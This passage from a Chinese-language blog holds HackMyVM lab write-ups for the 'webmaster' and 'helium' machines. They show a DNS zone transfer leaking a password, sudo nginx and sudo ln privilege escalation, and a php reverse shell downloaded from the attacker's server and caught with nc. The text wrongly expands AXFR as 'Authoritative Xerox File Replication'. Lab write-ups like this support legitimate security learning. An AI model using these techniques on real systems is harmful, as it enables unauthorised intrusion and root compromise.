<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -u 192.168.179.226 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt </span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.179.226</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line"><span class="section">Progress: 207643 / 207644 (100.00%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br></pre></td></tr></table></figure></div>
<p>竟然什么也没有<br>结合刚才有开放的dns服务和直接访问web给的注释，我怀疑是不是要改域名，所以编辑一下&#x2F;etc&#x2F;hosts再去访问，但是结果还是一样的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">└─# vim /etc/hosts      </span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">└─# curl <span class="number">192</span>.<span class="number">168</span>.<span class="number">179</span>.<span class="number">226</span></span><br><span class="line"> &lt;img src=<span class="string">&quot;comic.png&quot;</span> alt=<span class="string">&quot;comic&quot;</span>&gt; </span><br><span class="line">&lt;!--webmaster.hmv--&gt;</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">└─# cat /etc/hosts                                   </span><br><span class="line"><span class="number">127.0.0.1</span>	localhost</span><br><span class="line"><span class="number">127.0.1.1</span>	kakeru.localdomain	kakeru</span><br><span class="line"><span class="number">192.168.240.113</span> dc-<span class="number">2</span></span><br><span class="line"><span class="number">192.168.179.226</span> webmaster.hmv webmaster</span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::<span class="number">1</span>     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::<span class="number">1</span> ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span> ip6-allrouters</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>有关于dns服务的工具我想到的只有dig了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="code"><pre><span class="line">└─# dig @192.168.179.226 webmaster.hmv</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.20.4-3-Debian &lt;&lt;&gt;&gt; @192.168.179.226 webmaster.hmv</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 38750</span><br><span class="line">;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">; COOKIE: f32eda80cb81fb45c347235f67a96b271532378304054959 (good)</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;webmaster.hmv.			IN	A</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">webmaster.hmv.		604800	IN	SOA	ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800</span><br><span class="line"></span><br><span class="line">;; Query time: 63 msec</span><br><span class="line">;; SERVER: 192.168.179.226#53(192.168.179.226) (UDP)</span><br><span class="line">;; WHEN: Mon Feb 10 10:57:43 CST 2025</span><br><span class="line">;; MSG SIZE  rcvd: 115</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# dig 192.168.179.226                                                          </span><br><span class="line">;; communications error to 192.168.179.180#53: timed out</span><br><span class="line">;; communications error to 192.168.179.180#53: timed out</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.20.4-3-Debian &lt;&lt;&gt;&gt; 192.168.179.226</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 27766</span><br><span class="line">;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;192.168.179.226.		IN	A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">192.168.179.226.	0	IN	A	192.168.179.226</span><br><span class="line"></span><br><span class="line">;; Query time: 15 msec</span><br><span class="line">;; SERVER: 192.168.179.180#53(192.168.179.180) (UDP)</span><br><span class="line">;; WHEN: Mon Feb 10 10:56:55 CST 2025</span><br><span class="line">;; MSG SIZE  rcvd: 49</span><br></pre></td></tr></table></figure></div>
<p>但是我直接用没有解析出来，看了下wp，用了dig axfr</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">在 dig 命令中，AXFR 是一种查询类型，用于请求<span class="built_in"> DNS </span>区域传输（ Authoritative Xerox File Replication）。它用于从主<span class="built_in"> DNS </span>服务器获取整个<span class="built_in"> DNS </span>区域的所有记录，通常用于备份<span class="built_in"> DNS </span>记录或在主 / 辅助<span class="built_in"> DNS </span>服务器之间同步数据。</span><br></pre></td></tr></table></figure></div>
<p>用这个果然查到了信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# dig axfr @<span class="number">192.168.179.226</span> webmaster.hmv </span><br><span class="line"></span><br><span class="line"><span class="comment">; &lt;&lt;&gt;&gt; DiG 9.20.4-3-Debian &lt;&lt;&gt;&gt; axfr @192.168.179.226 webmaster.hmv</span></span><br><span class="line"><span class="comment">; (1 server found)</span></span><br><span class="line"><span class="comment">;; global options: +cmd</span></span><br><span class="line">webmaster.hmv.		<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">SOA</span>	ns1.webmaster.hmv. root.webmaster.hmv. <span class="number">2 604800</span> <span class="number">86400 2419200</span> <span class="number">604800</span></span><br><span class="line">webmaster.hmv.		<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">NS</span>	ns1.webmaster.hmv.</span><br><span class="line">ftp.webmaster.hmv.	<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">CNAME</span>	www.webmaster.hmv.</span><br><span class="line">john.webmaster.hmv.	<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">TXT</span>	&quot;Myhiddenpazzword&quot;</span><br><span class="line">mail.webmaster.hmv.	<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">A</span>	<span class="number">192.168.0.12</span></span><br><span class="line">ns1.webmaster.hmv.	<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">A</span>	<span class="number">127.0.0.1</span></span><br><span class="line">www.webmaster.hmv.	<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">A</span>	<span class="number">192.168.0.11</span></span><br><span class="line">webmaster.hmv.		<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">SOA</span>	ns1.webmaster.hmv. root.webmaster.hmv. <span class="number">2 604800</span> <span class="number">86400 2419200</span> <span class="number">604800</span></span><br><span class="line"><span class="comment">;; Query time: 59 msec</span></span><br><span class="line"><span class="comment">;; SERVER: 192.168.179.226#53(192.168.179.226) (TCP)</span></span><br><span class="line"><span class="comment">;; WHEN: Mon Feb 10 11:04:54 CST 2025</span></span><br><span class="line"><span class="comment">;; XFR size: 8 records (messages 1, bytes 274)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><code>john.webmaster.hmv.	604800	IN	TXT	&quot;Myhiddenpazzword&quot;</code>这条信息是可疑的<br>尝试ssh登录john账户，果然可以登录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh john@<span class="number">192.168</span>.<span class="number">179.226</span>      </span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.179.226 (192.168.179.226)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:Pc29l65Be7facFkvVvZRZLlHBJBvwLH5bOciipZXstQ.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.179.226&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">john@<span class="number">192.168</span>.<span class="number">179.226</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux webmaster <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">12</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span>.<span class="number">152</span>-<span class="number">1</span> (<span class="number">2020</span>-<span class="number">10</span>-<span class="number">18</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sat Dec  <span class="number">5</span> <span class="number">05</span>:<span class="number">38</span>:<span class="number">56</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">1.58</span></span><br><span class="line">john@webmaster:~$ </span><br></pre></td></tr></table></figure></div>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>有一个nginx的sudo指令，查查提权方式<br>找到一篇文章说可以指定nginx的配置文件，仿照示例配置文件写利用配置文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">john<span class="variable">@webmaster</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /usr/sbin/nginx -c /home/john/nginx.conf</span><br><span class="line">john<span class="variable">@webmaster</span><span class="symbol">:~</span><span class="variable">$ </span>cat nginx.conf </span><br><span class="line">user root;</span><br><span class="line">worker_processes <span class="number">4</span>;</span><br><span class="line">pid /tmp/nginx.pid;</span><br><span class="line">events &#123;</span><br><span class="line">        worker_connections <span class="number">768</span>;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">        server &#123;</span><br><span class="line">                listen <span class="number">1234</span>;</span><br><span class="line">                root /;</span><br><span class="line">                autoindex on;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后在web端访问1339端口就可以读取任意文件了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.226:1234/root/root.txt</span><br><span class="line">HMVnginxpwnd</span><br></pre></td></tr></table></figure></div>

<p>做完之后又在网上找到第二种思路<br>这个&#x2F;var&#x2F;www&#x2F;html竟然有写入权限</p>
<p>把反弹shell的php文件上传上来</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">python3</span> -<span class="keyword">m</span> http.server <span class="number">80</span></span><br><span class="line">Serving HTTP <span class="keyword">on</span> <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">80</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">179.226</span> - - [<span class="number">10</span>/Feb/<span class="number">2025</span> <span class="number">11</span>:<span class="number">36</span>:<span class="number">35</span>] <span class="string">&quot;GET /php-reverse-shell.php HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br><span class="line">john@webmaster:/var/www/html$ wget <span class="number">192.168</span>.<span class="number">179.83</span>/php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">09</span> <span class="number">22</span>:<span class="number">36</span>:<span class="number">35</span>--  http://<span class="number">192.168</span>.<span class="number">179.83</span>/php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php</span><br><span class="line">Connecting <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">179.83</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">5496</span> (<span class="number">5.4</span>K) [application/octet-stream]</span><br><span class="line">Saving <span class="keyword">to</span>: ‘php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php’</span><br><span class="line"></span><br><span class="line">php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php        <span class="number">100</span>%[==============================================&gt;]   <span class="number">5.37</span>K  --.-KB/s    in <span class="number">0</span>s      </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">09</span> <span class="number">22</span>:<span class="number">36</span>:<span class="number">35</span> (<span class="number">26.9</span> MB/s) - ‘php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php’ saved [<span class="number">5496</span>/<span class="number">5496</span>]</span><br></pre></td></tr></table></figure></div>
<p>这样在web访问这个文件之后，本地监听，也能得到root的shell<br><img src="https://pic1.imgdb.cn/item/67a975c2d0e0a243d4fdc8d1.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234              </span><br><span class="line">Linux webmaster 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64 GNU/Linux</span><br><span class="line"> 22:38:55 up  1:03,  1 user,  load average: 0.00, 0.00, 0.04<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER </span>    TTY      <span class="keyword">FROM</span>             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">john     pts/0    192.168.179.83   22:08   47.00s  2.57s  2.57s -bash</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure></div>

<p>总结： 我学到的：dig对dns解析的作用以及dig的axfr作用（获得整个dns服务区域的记录） 还有nginx的sudo提权，通过修改配置文件可以访问任意文件。最后有一个通用的思路尝试&#x2F;var&#x2F;www&#x2F;html能不能写入，如果可以就上传反弹shell</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-helium</title>
    <url>/posts/43260.html</url>
    <content><![CDATA[<p>HMV-helium靶场复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679f6263d0e0a243d4f99728.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.240.53 </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">02</span> <span class="number">20</span>:<span class="number">18</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.53</span></span><br><span class="line">Host is up (<span class="number">0.0020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">12</span>:f6:<span class="number">55</span>:<span class="number">5</span>f:c6:fa:fb:<span class="number">14</span>:<span class="number">15</span>:ae:<span class="number">4</span>a:<span class="number">2</span>b:<span class="number">38</span>:d8:<span class="number">4</span>a:<span class="number">30</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> b7:ac:<span class="number">87</span>:<span class="number">6</span>d:c4:f9:e3:<span class="number">9</span>a:d4:<span class="number">6</span>e:e0:<span class="number">4</span>f:da:aa:<span class="number">22</span>:<span class="number">20</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> fe:e8:<span class="number">05</span>:af:<span class="number">23</span>:<span class="number">4</span>d:<span class="number">3</span>a:<span class="number">82</span>:<span class="number">2</span>a:<span class="number">64</span>:<span class="number">9</span>b:f7:<span class="number">35</span>:e4:<span class="number">44</span>:<span class="number">4</span>a (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">|<span class="params">_http-title:</span> RELAX</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">56</span>:BD:<span class="number">76</span>:<span class="number">3</span>F:EB:<span class="number">82</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.03</span> ms <span class="number">192.168</span>.<span class="number">240.53</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.43</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>开放22和80端口 直接进入web部分</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://192.168.240.53         </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>RELAX<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Please paul, stop uploading weird .wav files using /upload_sound --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;screen-1.jpg&#x27;</span>);</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-attachment</span>: fixed; </span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;relax.wav&quot;</span> <span class="attr">preload</span>=<span class="string">&quot;auto loop&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里告诉了一个用户名paul 还有一个目录&#x2F;upload_sound 还有一个relax.wav可以下载<br>以为是wav隐写有关，但是我对misc不是很熟悉，也捣鼓了这个wav半天没有信息，结果是我搞错方向了<br>这个源码中的bootstrap.min.css可以访问，有一个wav文件，实际上要分析的是这个wav文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://192.168.240.53/bootstrap.min.css    </span><br><span class="line">/yay/mysecretsound.wav</span><br></pre></td></tr></table></figure></div>
<p>打开audacity选择频谱 可以看到有文字出现 这个就是密码<br><img src="https://pic1.imgdb.cn/item/679f74bbd0e0a243d4f99a53.png"><br><img src="https://pic1.imgdb.cn/item/679f74b9d0e0a243d4f99a52.png"><br>dancingpassyo<br>成功拿到用户shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh paul@<span class="number">192.168</span>.<span class="number">240.53</span>                     </span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.240.53 (192.168.240.53)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:y4b6laUdkY6jY95p0UousHuja503C9EIqNNrMD5hoqA.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.240.53&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">paul@<span class="number">192.168</span>.<span class="number">240.53</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Permission denied, please <span class="keyword">try</span> again.</span><br><span class="line">paul@<span class="number">192.168</span>.<span class="number">240.53</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux helium <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">12</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span>.<span class="number">152</span>-<span class="number">1</span> (<span class="number">2020</span>-<span class="number">10</span>-<span class="number">18</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sun Nov <span class="number">22</span> <span class="number">14</span>:<span class="number">31</span>:<span class="number">51</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">1.58</span></span><br><span class="line">paul@helium:~$ </span><br></pre></td></tr></table></figure></div>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>有一个sudo权限 可以执行一个程序</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">paul<span class="variable">@helium</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> paul on <span class="symbol">helium:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> paul may run the following commands on <span class="symbol">helium:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/ln</span><br><span class="line">paul<span class="variable">@helium</span><span class="symbol">:~</span><span class="variable">$ </span>file /usr/bin/ln</span><br><span class="line">/usr/bin/<span class="symbol">ln:</span> <span class="title class_">ELF</span> <span class="number">64</span>-bit <span class="title class_">LSB</span> pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (<span class="title class_">SYSV</span>), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64</span>.so.<span class="number">2</span>, <span class="keyword">for</span> <span class="title class_">GNU</span>/<span class="title class_">Linux</span> <span class="number">3.2</span>.<span class="number">0</span>, <span class="title class_">BuildID</span>[sha1]=<span class="number">90900</span>bc68d91aa5931e338d6445b520777431a02, stripped</span><br></pre></td></tr></table></figure></div>
<p>找到提权命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -fs /bin/sh /bin/ln</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span></span><br></pre></td></tr></table></figure></div>
